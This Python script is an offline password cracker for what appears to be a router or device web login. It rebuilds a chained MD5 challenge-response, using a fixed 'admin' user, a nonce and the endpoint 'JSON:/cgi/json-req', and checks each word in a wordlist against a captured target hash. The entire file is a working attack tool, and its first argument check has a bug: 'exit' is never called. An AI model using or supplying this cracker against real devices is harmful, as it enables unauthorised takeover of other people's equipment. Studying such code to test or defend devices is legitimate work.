import hashlib
import sys
import os


STATIC_AUTH_ENDPOINT = "JSON:/cgi/json-req"

if (len(sys.argv)< 3):
    print("not enough arguments supplied you must supply <wordlist path> <nonce> <target hash>")
    exit

wordlist = sys.argv[1].strip()
nonce = sys.argv[2].strip()
target = sys.argv[3].strip()

if not os.path.isfile(wordlist):
    print("wordlist does not exist")
    exit()
if not nonce:
    print("nonce is required")
    exit()
if not target:
    print("target hash is required")
    exit()

with open(wordlist) as wordlistFile:
    print("File opened starting password craking!")
    print("--------------------------------------")
    for count, word in enumerate(wordlistFile):
        word = word.strip()
        # Hash password
        md5Hasher = hashlib.md5()
        md5Hasher.update(word.encode("utf-8"))
        hashedPassword = md5Hasher.hexdigest()
        # Hash User::hex_md5(Pass)  Note: admin is constant
        md5Hasher = hashlib.md5()
        md5Hasher.update(("admin::"+hashedPassword).encode("utf-8"))
        hashedUserPass = md5Hasher.hexdigest()
        # Final Hash hashedUserPass:0:<nonce>:<STATIC_AUTH_ENDPOINT>
        md5Hasher = hashlib.md5()
        md5Hasher.update((hashedUserPass+":0:"+nonce+":"+STATIC_AUTH_ENDPOINT).encode("utf-8"))
        finalHash = md5Hasher.hexdigest()
        if (finalHash == target):
            print("Match Found! The password is: " + word)
            exit()
    print("No Match Found :(")